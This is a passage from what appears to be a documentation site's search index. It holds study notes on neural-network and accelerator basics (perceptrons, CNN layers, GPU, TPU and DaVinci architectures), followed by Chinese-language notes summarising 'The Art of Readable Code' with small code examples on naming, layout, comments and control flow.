CANN\u300b\u4e2d\u57fa\u7840\u7406\u8bba\u65b9\u9762\u7684\u4ecb\u7ecd\u3002</p>"},{"location":"misc/ann/#0-neuron-model","title":"0 Neuron model","text":"<p>The most basic unit in a biological neural network is a neuron, and its structure is shown in the following image. In the original mechanism of biological neural networks, each neuron has multiple dendrites, one axon, and one cell body. </p> <p>And then, it can be abstracted into a more mathematical model, called M-P neuron model </p>"},{"location":"misc/ann/#1-perception","title":"1 Perception","text":""},{"location":"misc/ann/#11-single-perceptron","title":"1.1 Single Perceptron","text":"<p>The perceptron can only deal with linear classification problems, and the output results are limited to 0 and 1. </p>"},{"location":"misc/ann/#12-multilayer-perceptron","title":"1.2 Multilayer perceptron","text":"<p>This deep structure is called multilayer perceptron (MLP), also known as a fully connected neural network (FCNN). An MLP can classify an input into multiple categories. </p>"},{"location":"misc/ann/#2-convolutional-neural-network","title":"2 Convolutional Neural Network","text":"<p>CNNs require three processes: build the network architecture, train the network, and perform inference. For a specific application, a hierarchical architecture of CNNs, including an input layer, convolution layers, pooling layers, fully connected layers, and output layer, are required. </p>"},{"location":"misc/ann/#21-convolution-layers","title":"2.1 Convolution layers","text":"<p>The convolution kernel weights generally use a matrix of size 1x1, 3x3, or 7x7, and the weight of each convolution kernel is shared by all convolution windows on the input feature map. </p>"},{"location":"misc/ann/#22-pooling-layers","title":"2.2 Pooling layers","text":"<ul> <li>Background<ul> <li>the number of neurons increases, and amouts of parameters need to be trained.</li> <li>the overfitting problem.</li> </ul> </li> <li>The pooling layer typically uses a filter to extract representative features for diffterent locations.</li> </ul>"},{"location":"misc/ann/#23-fully-connected-layers","title":"2.3 Fully connected layers","text":"<p>A fully connected layer is equivalent to an MLP, which performs classification upon input features.</p>"},{"location":"misc/ann/#24-parallelism","title":"2.4 Parallelism","text":"<ul> <li> <p>Synaptic parallelism: For convolution kernels of size \\(K\\times K\\), the maximum synaptic parallelism is also \\(K\\times K\\).</p> </li> <li> <p>Neuron parallelism: Each of the convolution windows has no data dependency upon the other and thus can be computed in parallel.     </p> </li> <li> <p>Input feature map parallelism: the maximum parallelism for an input image with N channels is N.     </p> </li> <li> <p>Output feature map parallelism: Just same as the input feature map parallelism</p> </li> <li> <p>Batch parallelism: In the practical application of CNNs, in order to make full use of the bandwidth and computing power of the hardware, more than one image are processed at a time, which form a batch.     </p> </li> </ul>"},{"location":"misc/ann/#3-neural-network-processor-acceleration-theory","title":"3 Neural network processor acceleration theory","text":""},{"location":"misc/ann/#31-gpu-acceleration-theory","title":"3.1 GPU acceleration theory","text":"<p>The major ways to accelerate neural networks with GPUs are through parallelization and vectorization.</p> <p>The vectorization approach can be illustrated by the following diagram. And the multiplication and addition operations can be parallezed and processed by parallel computing components. </p> <p>With the development of the GPU industry, more and more GPUs with modern architecure have been develeped. Like the Turing Stream Processor. The most important part of the Turing Stream Processor is Tensor Core\uff0cand each tensor core can perform 64 times of fused multiply and add (FMA) operations with the precision of FP16 in one clock cycle. </p>"},{"location":"misc/ann/#32-tpu-acceleration-theory","title":"3.2 TPU acceleration theory","text":"<p>The way in which the convolution is computed in the TPU is different from that of the GPU, which mainly relies on a hardware circuit structure called \u201csystolic array.\u201d As shown in the following figure.  And the \"systolic array\" is a simple and regular but practical design.</p>"},{"location":"misc/ann/#33-davinci-architecture","title":"3.3 DaVinci architecture","text":"<p>Unlike traditional CPUs and GPUs that support general-purpose computing, or ASIC processors dedicated to a particular algorithm, the DaVinci architecture is designed to adapt to common applications and algorithms within a particular field, commonly referred to as \u201cdomain-specific architecture (DSA)\u201d processors. It includes three basic computing resources: Cube Unit, Vector Unit and Scalar Unit. These three computing units correspond to three common computing modes: tensor, vector and scalar. Cube Unit (CU) provides powerful parallel multiplication and addition computations, enabling AI Core to finish matrix computations rapidly. Through the elaborate design of customized circuits and aggressive back-end optimizations, the Cube Unit can complete the multiplication operation of two \\(16\\times16\\) matrices with one instruction (referred to as \\(16^3\\) , also the name origin of Cube).  Note that the Matrix B is Column-Major.(To accelerate access efficiency) Moreover, if the matrix is even bigger, we can use the partitioning method. </p> <p>Thus, how can we apply CUBE to convolution acceleration? The matries will be transformed into columns(Img2Col), which can be treated as a new matrix. And then the convolution is converted to matrix multiplication. </p>"},{"location":"misc/code/","title":"The Art of the Readable Code","text":"<p>Info</p> <p>\u672c\u7bc7\u7b14\u8bb0\u4e3b\u8981\u6458\u81ea\u300a\u7f16\u5199\u53ef\u8bfb\u4ee3\u7801\u7684\u827a\u672f\u300b\uff08The Art of Readable Code\uff09\u3002\u6709\u591a\u5e74\u5de5\u7a0b\u4ee3\u7801\u7f16\u7a0b\u7ecf\u9a8c\u7684\u4f5c\u8005\uff0c\u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u4e86\u5982\u4f55\u7f16\u5199\u53ef\u8bfb\u4ee3\u7801\u7684\u6280\u5de7\u4e0e\u539f\u5219\uff0c\u4ece\u4ee3\u7801\u98ce\u683c\u5230\u903b\u8f91\u6846\u67b6\u7684\u6784\u5efa\uff0c\u7ed9\u51fa\u4e86\u4e0d\u5c11\u5b9e\u7528\u7684\u5efa\u8bae\u3002</p>"},{"location":"misc/code/#1","title":"1 \u8868\u9762\u5c42\u6b21\u7684\u6539\u8fdb","text":""},{"location":"misc/code/#11","title":"1.1 \u8d77\u540d\u7684\u827a\u672f","text":"<p>\ud83d\udca1\u5efa\u8bae\u4e00\uff1a\u907f\u514d\u7a7a\u6d1e\u7684\u8bcd\u6c47\uff0c\u6bd4\u5982\uff1a<code>get</code>, <code>size</code>...\uff0c\u53ef\u66ff\u6362\u6210 <code>height</code>, <code>fetch</code>, <code>load</code>...</p> \u5355\u8bcd \u66f4\u591a\u9009\u62e9 send deliver, dispatch, distribute find search, extract, locate start create, begin, open make create, build, add <p>\ud83d\udca1\u5efa\u8bae\u4e8c\uff1a\u6b63\u786e\u4f7f\u7528\u7279\u6b8a\u8bcd\u6c47\u3002</p> <p>\u6bd4\u5982\u7d22\u5f15\u548c\u8fed\u4ee3\u5668\uff1a<code>i</code>\uff0c<code>j</code>\uff0c<code>it</code>...\uff1b\u6216\u8005\u4e34\u65f6\u53d8\u91cf <code>tmp</code>... \u5728\u5faa\u73af\u4e2d\uff0c\u4e3a\u4f7f\u5f97\u4e0d\u4f1a\u9519\u4f4d\u4f7f\u7528\u8fed\u4ee3\u5668\uff0c\u53ef\u4ee5\u5728\u8fed\u4ee3\u5668\u4e2d\u52a0\u5165\u76f8\u5173\u4fe1\u606f\uff0c\u5982 <code>number_i</code>\uff0c<code>club_i</code>\u3002</p> <p>\ud83d\udca1\u5efa\u8bae\u4e09\uff1a\u7ed9\u540d\u5b57\u9644\u4e0a\u989d\u5916\u7684\u4fe1\u606f\u3002</p> <ul> <li>\u5df2\u8f6c\u5316\u4e3a UTF-8 \u683c\u5f0f\u7684 html \u5b57\u8282\uff1a<code>html_utf8</code></li> <li>\u7a0b\u5e8f\u5f00\u59cb\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff1a<code>start_ms</code></li> </ul> <p>\ud83d\udca1\u5efa\u8bae\u56db\uff1a\u4e0d\u5b9c\u8fc7\u957f\u3002</p> <p>\u5f53\u7136\u5728\u53d8\u91cf\u4e2d\u4e00\u5473\u5730\u5b58\u50a8\u4fe1\u606f\u4e5f\u662f\u4e0d\u5f97\u5f53\u7684\uff0c\u4e0d\u7136\u5c31\u53ef\u80fd\u4f1a\u4f7f\u5b83\u53c8\u81ed\u53c8\u957f\uff0c\u53ef\u4ee5\u9002\u5f53\u4f7f\u7528\u4e00\u4e9b\u65b9\u6cd5\u4f7f\u5176\u7f29\u77ed\u3002</p> <ol> <li>\u4f7f\u7528\u9996\u5b57\u6bcd\u7f29\u7565\u8bcd\uff1a\u4f46\u4ec5\u4ec5\u5e94\u7528\u4e8e\u7ea6\u5b9a\u4fd7\u6210\u7684\u7f29\u5199\uff0c\u5982 <code>evaluation</code> -&gt; <code>eval</code>\uff0c<code>documentation</code> -&gt; <code>doc</code>\u3002\u4e66\u4e2d\u63d0\u51fa\u4e86\u4e00\u4e2a\u5f88\u76f4\u622a\u4e86\u5f53\u7684\u4f7f\u7528\u573a\u666f\u5224\u65ad\u65b9\u6cd5\uff1a\u8ba9\u8fd9\u4e9b\u7f29\u5199\u5bf9\u9879\u76ee\u7684\u65b0\u6210\u5458\u6765\u8bf4\u4e0d\u964c\u751f\u548c\u8d39\u89e3\u3002</li> <li>\u4e22\u6389\u6ca1\u7528\u7684\u8bcd\u6c47\uff0c\u5982 <code>ConvertToString</code> -&gt; <code>ToString</code>\u3002</li> </ol> <p>\ud83d\udca1\u5efa\u8bae\u4e94\uff1a\u5728\u5c0f\u7684\u4f5c\u7528\u57df\u4e2d\u4f7f\u7528\u8f83\u77ed\u7684\u540d\u5b57\uff1b\u76f8\u53cd\uff0c\u4f5c\u7528\u57df\u5927\u7684\u8bcd\u6c47\u5e94\u5c3d\u53ef\u80fd\u957f\u4e14\u8be6\u7ec6\u3002</p> <p>\ud83d\udca1\u5efa\u8bae\u516d\uff1a\u907f\u514d\u6b67\u4e49\u3002</p> <p>\u5efa\u8bae\u867d\u77ed\uff0c\u4f46\u5176\u5b9e\u5f88\u96be\u505a\u5230\u5b8c\u7f8e\u3002\u6bd4\u5982\u5bf9\u4e8e\u5e03\u5c14\u503c\uff0c<code>bool read_password = true</code>\uff0c\u5c31\u5bb9\u6613\u4ea7\u751f\u4e24\u79cd\u610f\u601d\uff1a1\uff09\u8981\u53bb\u8bfb\u5bc6\u7801 2\uff09\u5df2\u7ecf\u8bfb\u5165\u5bc6\u7801\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u901a\u8fc7 <code>need_password</code> \u6216 <code>user_is_authenticated</code> \u66ff\u4ee3\u3002</p>"},{"location":"misc/code/#12","title":"1.2 \u6392\u7248","text":"<p>\u4e66\u4e2d\u6b64\u5757\u7684\u5185\u5bb9\u662f\u300a\u5ba1\u7f8e\u300b\uff0c\u4f46\u603b\u4f53\u662f\u548c\u4ee3\u7801\u6392\u7248\u76f8\u5173\u7684\uff0c\u6240\u4ee5\u4f7f\u7528\u6392\u7248\u4f5c\u4e3a\u6982\u62ec\u53ef\u80fd\u66f4\u4e3a\u6070\u5f53\u3002\u9996\u5148\uff0c\u4e66\u4e2d\u63d0\u51fa\u4e86\u4e09\u6761\u539f\u5219\uff1a</p> <ol> <li>\u4f7f\u7528\u4e00\u81f4\u7684\u5e03\u5c40\uff0c\u8ba9\u8bfb\u8005\u80fd\u5feb\u901f\u9002\u5e94</li> <li>\u5f53\u76f8\u4f3c\u7684\u4ee3\u7801\u5c3d\u53ef\u80fd\u76f8\u4f3c</li> <li>\u628a\u76f8\u5173\u7684\u4ee3\u7801\u5206\u7ec4\uff0c\u5f62\u6210\u4ee3\u7801\u5757</li> </ol> <p>\u5177\u4f53\u800c\u8a00\uff0c\u4e3a\u4e86\u8ba9\u4ee3\u7801\u53d8\u5f97\u6574\u9f50\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u53ef\u4ee5\u53c2\u8003\u7684\u65b9\u6cd5\u3002</p> <p>\ud83d\udca1\u65b9\u6cd5\u4e00\uff1a\u4f7f\u7528\u51fd\u6570\u3002</p> <p>\u5c31\u5982\u4e66\u4e2d\u4e09\u6761\u539f\u5219\u4e2d\u7684\u7b2c\u4e8c\u6761\uff0c\u6211\u4eec\u5e94\u5f53\u8ba9\u76f8\u4f3c\u529f\u80fd\u7684\u4ee3\u7801\u5728\u5916\u89c2\u4e0a\u4e5f\u5c3d\u53ef\u80fd\u76f8\u4f3c\u3002</p> <pre><code>assert(ExpendFullName(database_connection, \"Doug Adams\", &amp;error)\n      == \"Mr. Douglas Adams\");\nassert(error == \"\");\nassert(ExpendFullName(database_connection, \"Jake Brown\", &amp;error)\n      == \"Mr. Jocob Brown III\");\nassert(error == \"\");\nassert(ExpendFullName(database_connection, \"No Such Guy\", &amp;error) == \"\");\nassert(error == \"on match found\");\nassert(ExpendFullName(database_connection, \"John\", &amp;error) == \"\");\nassert(error == \"more than one result\");\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u4e0d\u9002\u7528\u4e8e\u8fd9\u6761\u89c4\u5219\uff0c\u5b83\u7684\u5355\u6761\u8bed\u53e5\u8fc7\u957f\u4ee5\u81f4\u9700\u8981\u6362\u884c\uff0c\u540c\u65f6\u6211\u4eec\u53d1\u73b0\u5b83\u7684\u529f\u80fd\u662f\u91cd\u590d\u7684\u3002\u6b64\u65f6\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570\u5bf9\u5176\u8fdb\u884c\u5305\u88f9\u4e0e\u6574\u7406\uff0c\u5c31\u53ef\u4ee5\u8fbe\u5230\u4e0b\u9762\u7684\u72b6\u6001\uff1a</p> <pre><code>CheckFullName(\"Doug Adams\", \"Mr. Douglas Adams\"  , \"\");\nCheckFullName(\"Jake Brown\", \"Mr. Jocob Brown III\", \"\");\nCheckFullName(\"No such Guy\", \"\", \"no match found\");\nCheckFullName(\"John\", \"\", \"more than one result\");\n</code></pre> <p>\ud83d\udca1\u65b9\u6cd5\u4e8c\uff1a\u4f7f\u7528\u5217\u5bf9\u9f50\u3002</p> <p>\u5217\u7684\u8fb9\u63d0\u4f9b\u4e86\u201c\u53ef\u89c1\u7684\u680f\u6746\u201d\uff0c\u9605\u8bfb\u8d77\u6765\u5f88\u65b9\u4fbf\uff0c\u8fd9\u662f\u4e2a\u201c\u8ba9\u76f8\u4f3c\u7684\u4ee3\u7801\u770b\u8d77\u6765\u76f8\u4f3c\u7684\u597d\u4f8b\u5b50\u201d\u3002</p> <p>\u5bf9\u4e8e\u65b9\u6cd5\u4e00\u4e2d\u7528\u51fd\u6570\u6574\u7406\u8fc7\u7684\u4ee3\u7801\uff0c\u5176\u5b9e\u770b\u8d77\u6765\u4ecd\u4e0d\u662f\u5f88\u76f4\u89c2\uff0c\u53ef\u80fd\u7684\u539f\u56e0\u5c31\u662f\u65e0\u6cd5\u4e00\u773c\u770b\u51fa\u5f53\u524d\u7684\u5b57\u7b26\u4e32\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002\u6b64\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528\u5217\u5bf9\u9f50\u4f7f\u5176\u8bed\u4e49\u66f4\u52a0\u4e00\u76ee\u4e86\u7136\u3002</p> <pre><code>CheckFullName(\"Doug Adams\" , \"Mr. Douglas Adams\"  , \"\");\nCheckFullName(\"Jake Brown\" , \"Mr. Jocob Brown III\", \"\");\nCheckFullName(\"No such Guy\", \"\"                   , \"no match found\");\nCheckFullName(\"John\"       , \"\"                   , \"more than one result\");\n</code></pre> <p>\ud83d\udca1\u65b9\u6cd5\u4e09\uff1a\u56fa\u5b9a\u987a\u5e8f\u3002</p> <p>\u5f88\u591a\u65f6\u5019\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u7c7b\u4e2d\u7684\u5f88\u591a\u53d8\u91cf\uff0c\u65e0\u8bba\u662f\u5728\u58f0\u660e\u8fd8\u662f\u5728\u4f7f\u7528\u65f6\uff0c\u6700\u597d\u80fd\u4fdd\u6301\u4e00\u5b9a\u7684\u987a\u5e8f\uff08\u6bd4\u5982\u91cd\u8981\u6027\uff0c\u6216\u8005\u5b57\u7b26\u5927\u5c0f\u7b49\u7b49\uff09\uff0c\u5e76\u5728\u540e\u9762\u4e00\u76f4\u6cbf\u7528\u6b64\u987a\u5e8f\u3002</p> <p>\ud83d\udca1\u65b9\u6cd5\u56db\uff1a\u5206\u6bb5\u4ee3\u7801\u3002</p> <p>\u5bf9\u4ee3\u7801\u8fdb\u884c\u5206\u6bb5\u6709\u8bf8\u591a\u597d\u5904\uff0c\u9996\u5148\u5b83\u5c06\u76f8\u4f3c\u529f\u80fd\u7684\u4ee3\u7801\u653e\u5728\u4e00\u8d77\uff0c\u80fd\u5e2e\u52a9\u7406\u89e3\u4ee3\u7801\u7684\u903b\u8f91\uff0c\u5feb\u901f\u901a\u8bfb\u4ee3\u7801\uff08\u7279\u522b\u662f\u914d\u5408\u6ce8\u91ca\u9605\u8bfb\u65f6\uff09\u3002\u540c\u65f6\u4e5f\u53ef\u4ee5\u5e2e\u52a9\u8bfb\u8005\u5b9a\u4f4d\u81ea\u5df1\u73b0\u5728\u6240\u9605\u8bfb\u7684\u4f4d\u7f6e\u3002\u4ee5\u4e0b\u662f\u4e00\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>def suggest_new_friends(user, email_password):\n    # Get the user's friends' email addresses.\n    friends = user.friends();\n    friends_emails = set(f.email for f in friends)\n\n    # Import all email addresses from this user's email account.\n    contacts = import_contacts(user.email, email_password)\n    contact_emails = set(c.email for c in contacts)\n\n    # Find matching users that they aren't already friends with.\n    non_friend_emails = contact_emails - friend_emails\n    suggested_friends = User.objects.select(email_in=non_friend_emails)\n\n    # Display these lists on the page.\n    display['user'] = user\n    display['friends'] = friends\n    display['suggested_friends'] = suggested_friends\n\n    return render(\"sugguested_friends.html\", display)\n</code></pre>"},{"location":"misc/code/#13","title":"1.3 \u6ce8\u91ca","text":"<p>\u9996\u5148\u6211\u4eec\u9700\u8981\u77e5\u9053\u5728\u54ea\u4e9b\u60c5\u51b5\u4e0b\u662f\u4e0d\u9700\u8981\u6ce8\u91ca\u7684\uff1a</p> <ol> <li>\u4e3a\u4e86\u5199\u6ce8\u91ca\u800c\u5199\u6ce8\u91ca\uff0c\u5373\u6ca1\u6709\u63d0\u4f9b\u66f4\u591a\u4fe1\u606f\u7684\u6ce8\u91ca</li> <li>\u4e3a\u89e3\u91ca\u6666\u6da9\u7684\u547d\u540d\u7684\u6ce8\u91ca\u3002\u597d\u4ee3\u7801&gt;\u574f\u4ee3\u7801+\u597d\u6ce8\u91ca</li> </ol> <p>\u5728\u5f88\u591a\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u5bf9\u5982\u4f55\u5199\u6ce8\u91ca\u4ecd\u65e0\u4ece\u4e0b\u624b\uff0c\u4f5c\u8005\u7ed9\u51fa\u4e86\u4e00\u4e9b\u7ecf\u5178\u7684\u5e94\u7528\u573a\u666f\u3002</p> <p>\ud83c\udfdd \u573a\u666f\u4e00\uff1a\u4e3a\u4ee3\u7801\u4e2d\u7684\u7455\u75b5\u5199\u6ce8\u91ca\u3002</p> \u6807\u8bb0 \u901a\u5e38\u7684\u610f\u4e49 TODO: \u8fd8\u6ca1\u6709\u5904\u7406\u7684\u4e8b\u60c5 FIXME: \u5df2\u77e5\u7684\u65e0\u6cd5\u8fd0\u884c\u7684\u4ee3\u7801 HACK: \u5bf9\u4e00\u4e2a\u95ee\u9898\u4e0d\u5f97\u4e0d\u91c7\u7528\u7684\u6bd4\u8f83\u7c97\u7cd9\u7684\u65b9\u6cd5 <pre><code>// TODO: add connect function\n</code></pre> <p>\ud83c\udfdd \u573a\u666f\u4e8c\uff1a\u4e3a\u5e38\u91cf\u52a0\u6ce8\u91ca\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u6bcf\u4e2a\u5e38\u91cf\u90fd\u6709\u4e00\u4e2a\u8bbe\u7f6e\u4e3a\u8be5\u503c\u7684\u7f18\u7531\u3002</p> <pre><code>// Impose a reasonable limit - no human can read that much anyway\nconst int MAX_RSS_SUBSCRIPTION = 1000;\n</code></pre> <p>\ud83c\udfdd \u573a\u666f\u4e09\uff1a\u53ef\u80fd\u5f15\u8d77\u6b67\u4e49\u7684\u5730\u65b9\u3002</p> <p>\ud83c\udfdd \u573a\u666f\u56db\uff1a\u53ef\u80fd\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u3002</p> <p>\ud83c\udfdd \u573a\u666f\u4e94\uff1a\u603b\u7ed3\u6027\u7684\u6ce8\u91ca\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e9b\u4ee3\u7801\u5757\uff0c\u5728\u524d\u9762\u52a0\u4e0a\u6ce8\u91ca\u53ef\u4ee5\u65b9\u6cd5\u8bfb\u8005\u5728\u9605\u8bfb\u4ee3\u7801\u7ec6\u8282\u524d\u6709\u4e00\u4e2a\u603b\u4f53\u7684\u5370\u8c61\u3002\u5c31\u5982\u6392\u7248\u7684\u7b2c\u56db\u4e2a\u65b9\u6cd5\u7684\u4f8b\u5b50\u4e2d\u7684\u5e94\u7528\u90a3\u6837\uff0c\u548c\u4ee3\u7801\u5206\u5757\u914d\u5408\u4f7f\u7528\uff0c\u4f1a\u67091+1&gt;2\u7684\u6548\u679c\u3002</p>"},{"location":"misc/code/#2","title":"2 \u7b80\u5316\u5faa\u73af\u903b\u8f91","text":""},{"location":"misc/code/#21","title":"2.1 \u4f18\u5316\u63a7\u5236\u6d41","text":"<p>\u2705 \u5efa\u8bae\u4e00\uff1a\u8c03\u6574\u5224\u65ad\u6761\u4ef6\u7684\u5de6\u53f3\u987a\u5e8f</p> <p>\u5bf9\u4e8e\u4ee5\u4e0b\u4e24\u6761\u6307\u4ee4\uff0c\u76f8\u4fe1\u4f60\u4f1a\u66f4\u559c\u6b22\u524d\u8005\u800c\u4e0d\u662f\u540e\u8005\uff0c\u8fd9\u53ef\u80fd\u4e0e\u6211\u4eec\u7684\u601d\u7ef4\u4e60\u60ef\u6709\u5173\u7cfb\u3002\u5728\u7f16\u5199\u4ee3\u7801\u65f6\uff0c\u8bf7\u5c3d\u91cf\u5c06\u5e38\u91cf\u653e\u5728\u53f3\u8fb9\uff0c\u800c\u4f1a\u53d8\u5316\u7684\uff0c\u88ab\u7528\u4e8e\u68c0\u67e5\u3001\u6bd4\u8f83\u7684\u503c\u653e\u5728\u5de6\u8fb9\u3002</p> <pre><code>// \u53d8\u91cf\u5728\u5de6\uff0c\u5e38\u91cf\u5728\u53f3\nif (length &gt;= 10) {\n    // do something\n}\n// \u5e38\u91cf\u5728\u5de6\uff0c\u53d8\u91cf\u5728\u53f3\nif (10 &lt;= length) {\n    // do something\n}\n</code></pre> <p>\u2705 \u5efa\u8bae\u4e8c\uff1a\u8c03\u6574\u6761\u4ef6\u8bed\u53e5\u7684\u524d\u540e\u987a\u5e8f</p> <ul> <li>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u80fd\u559c\u6b22\u6b63\u903b\u8f91\u5927\u4e8e\u8d1f\u903b\u8f91\u3002     <pre><code>// \u6b63\u903b\u8f91\nif (a == b) {\n    // do somehting\n} \nelse {\n    // do something\n}\n// \u8d1f\u903b\u8f91\nif (a != b) {\n    // do something\n}\nelse {\n    // do something\n}\n</code></pre></li> <li>\u5148\u5904\u7406\u7b80\u5355\u7684\u903b\u8f91\uff0c\u518d\u5904\u7406\u590d\u6742\u7684\u903b\u8f91     \u5f53\u7136\uff0c\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u903b\u8f91\u7684\u590d\u6742\u4e0e\u5426\u548c\u524d\u9762\u7684\u6b63\u8d1f\u903b\u8f91\u4f1a\u53d1\u751f\u51b2\u7a81\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u8fdb\u884c\u53d6\u820d\u548c\u8003\u91cf\u4e86\u3002\u4ee5\u4e0b\u5c31\u662f\u4e3a\u5148\u5904\u7406\u91cd\u8981\u7684\u903b\u8f91\u800c\u540c\u65f6\u201c\u8fdd\u80cc\u201d\u7b80\u5355\u903b\u8f91\u539f\u5219\u548c\u6b63\u903b\u8f91\u539f\u5219\u7684\u7ecf\u5178\u4f8b\u5b50\uff1a     <pre><code>if not file:\n    # Log the error ...\nelse:\n    # ...\n</code></pre></li> </ul> <p>\u2705 \u5efa\u8bae\u4e09\uff1a\u8c28\u614e\u4f7f\u7528\u53ef\u80fd\u5f71\u54cd\u53ef\u8bfb\u6027\u7684\u8868\u8fbe\u5f0f\u3002</p> <ul> <li>\u4e09\u76ee\u8fd0\u7b97\u7b26 <code>return exponent &gt;=0 ? mantissa * (1 &lt;&lt; exponent) : mantissa / (1 &lt;&lt; -exponent);</code></li> <li>do/while \u5faa\u73af</li> <li>goto</li> </ul> <p>\u2705 \u5efa\u8bae\u56db\uff1a\u6700\u5c0f\u5316\u6761\u4ef6\u8bed\u53e5\u5d4c\u5957\u3002</p> <p>\u5f88\u591a\u60c5\u51b5\u4e0b\uff0c\u5728\u524d\u4eba\u57fa\u7840\u4e0a\u8fdb\u884c\u529f\u80fd\u6dfb\u52a0\u65f6\uff0c\u5c31\u5bb9\u6613\u51fa\u73b0\u5728\u8bed\u53e5\u4e2d\u5d4c\u5957\u6761\u4ef6\u8bed\u53e5\uff0c\u4f8b\u5982\u4e0b\u65b9\u65f6\u4ee3\u7801\u539f\u6709\u903b\u8f91\u3002</p> <pre><code>if (user_result == SUCCESS) {\n    reply.WriteErrors(\"\");\n} else {\n    reply.WriteErrors(user_result);\n}\n</code></pre> <p>\u540e\u6765\u589e\u52a0\u903b\u8f91\u540e\u53d8\u4e3a\uff1a</p> <pre><code>if (user_result == SUCCESS) {\n    if (permission_result != SUCCESS) {\n        reply.WriteErrors(\"error reading permissions\");\n        return;\n    }\n    reply.WriteErrors(\"\");\n} else {\n    reply.WriteErrors(user_result);\n}\n</code></pre> <p>\u5b9e\u9645\u4e0a\uff0c\u53ea\u8981\u518d\u7565\u52a0\u601d\u8003\uff0c\u5c31\u80fd\u5c06\u4e0a\u9762\u4e0d\u7f8e\u89c2\u4e14\u96be\u4ee5\u7406\u89e3\u7684\u4ee3\u7801\u903b\u8f91\u7b80\u5316\u3002</p> <pre><code>if (user_result != SUCCESS) {\n    reply.WriteErrors(user_result);\n}\nelse if (permission_result != SUCCESS) {\n    reply.WriteErrors(\"error reading permissions\");\n}\nelse {\n    reply.WriteErrors(\"\");\n}\n</code></pre>"},{"location":"misc/code/#22","title":"2.2 \u62c6\u5206\u957f\u8868\u8fbe\u5f0f","text":"<p>\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u7684\u5185\u5bb9\u5728 1.2 \u6392\u7248 \u4e2d\u7565\u6709\u63d0\u53ca\uff0c\u8868\u8fbe\u5f0f\u8fc7\u957f\u6709\u4e24\u4e2a\u7f3a\u70b9\uff0c\u4e00\u65b9\u9762\u662f\u4e0d\u591f\u7f8e\u89c2\uff0c\u53e6\u4e00\u65b9\u9762\u53ef\u8bfb\u6027\u4e5f\u4e0d\u591f\u5f3a\u3002\u5c31\u5982\u4e0b\u65b9\u4ee3\u7801\uff0c\u5224\u65ad\u6761\u4ef6\u7684\u5de6\u8fb9\u90e8\u5206\u53c8\u662f <code>split</code> \u53c8\u662f <code>strip</code> \uff0c\u542b\u4e49\u5e76\u4e0d\u591f\u6e05\u9664\u660e\u767d\u3002</p> <pre><code>if line.split(':')[0].strip() == \"root\":\n    # do something\nelif line.split(':')[0].strip() == \"user1\":\n    # do something\n</code></pre> <p>\u82e5\u5c06\u88ab\u5224\u65ad\u7684\u503c\u8d4b\u7ed9\u4e00\u4e2a\u53d8\u91cf\uff0c\u5c31\u53ef\u4ee5\u4f7f\u5f97\u5224\u65ad\u6761\u4ef6\u66f4\u52a0\u76f4\u89c2\u53ef\u8bfb\u3002</p> <pre><code>username = line.split(':')[0].strip()\nif  username == \"root\":\n    # do something\nelif username == \"user1\":\n    # do something  \n</code></pre> <p>\u5f53\u7136\u9664\u4e86\u4f7f\u7528\u53d8\u91cf\u5916\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570/\u5b8f\u5b9a\u4e49\u5728\u5408\u9002\u7684\u573a\u666f\u4e2d\u8fbe\u5230\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u7684\u76ee\u7684\u3002</p>"},{"location":"misc/code/#23","title":"2.3 \u5408\u7406\u8bbe\u7f6e\u53d8\u91cf","text":"<p>\u5728\u4e0a\u4e00\u7ae0\u4e2d\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4e3a\u4e86\u589e\u52a0\u4ee3\u7801\u53ef\u8bfb\u6027\u62c6\u5206\u957f\u8868\u8fbe\u5f0f\u800c\u589e\u8bbe\u53d8\u91cf\uff0c\u4f46\u662f\u5728\u4ee3\u7801\u53ef\u8bfb\u6027\u4e0d\u53d7\u5f71\u54cd\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5f53\u5c3d\u53ef\u80fd\u5730\u51cf\u5c11\u53d8\u91cf\uff0c\u5e76\u5c3d\u53ef\u80fd\u5730\u4f7f\u7528\u5e38\u91cf\u3002\u5bf9\u4e8e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7f29\u5c0f\u8d77\u4f5c\u7528\u57df\u4e5f\u53ef\u4ee5\u907f\u514d\u5236\u9020\u8fc7\u591a\u7684 bug\u3002 \u6bd4\u5982\u4e0b\u65b9\u4ee3\u7801\uff0c\u82e5 <code>now</code> \u53ea\u5728\u4e00\u4e2a\u5730\u65b9\u7528\u5230\uff0c\u5219\u4e0d\u5982\u5220\u53bb <code>now</code> \u4ee5\u7f29\u51cf\u4e0d\u5fc5\u8981\u7684\u53d8\u91cf\uff0c\u4e14\u8fd9\u6837\u7684\u4f5c\u6cd5\u51e0\u4e4e\u4e0d\u4f1a\u5f71\u54cd\u53ef\u8bfb\u6027\u3002</p> <pre><code>now = datatime.datetime.now()\nroot_message.last_view_time = now\n</code></pre> <pre><code>root_message.last_view_time = datatime.datetime.now()\n</code></pre>"},{"location":"misc/code/#3","title":"3 